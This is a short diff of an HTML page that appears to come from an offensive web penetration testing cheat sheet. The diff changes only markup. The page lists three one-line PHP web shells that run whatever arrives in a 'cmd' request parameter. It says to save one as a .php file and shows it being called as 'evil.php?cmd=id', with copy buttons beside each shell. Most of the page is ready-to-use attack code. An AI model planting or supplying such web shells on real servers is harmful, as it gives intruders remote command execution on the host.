@@ -33,14 +33,14 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/tools_usage.html'" style="float: left;">&lt;&lt;</button><br><br>
 <b>NOTES:</b> 
 
-1. Save code as .php file
+<b>1. Save code as .php file</b>
 
-<b>W1: </b><p id="ws01"><mark>&lt;&quest;php system($_GET["cmd"]); &quest;&gt;</mark></p>
-<b>W2: </b><p id="ws02"><mark>&lt;&quest;php echo exec($_POST['cmd']); &quest;&gt;</mark></p>
-<b>W3: </b><p id="ws03"><mark>&lt;&quest;php echo passthru($_GET['cmd']); &quest;&gt;</mark></p>
+<b>W1: </b><mark id="ws01">&lt;&quest;php system($_GET["cmd"]); &quest;&gt;</mark>
+<b>W2: </b><mark id="ws02">&lt;&quest;php echo exec($_POST['cmd']); &quest;&gt;</mark>
+<b>W3: </b><mark id="ws03">&lt;&quest;php echo passthru($_GET['cmd']); &quest;&gt;</mark>
 
 <b>USAGE:</b> http://ip_addr/evil.php?cmd=id <br>
-*suppose the file was saved as <u>evil.php</u>
+*suppose the file was saved as <u>evil.php</u> 
   
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ws01')">.W1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ws02')">.W2.</button> |<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ws03')">.W3.</button>
   
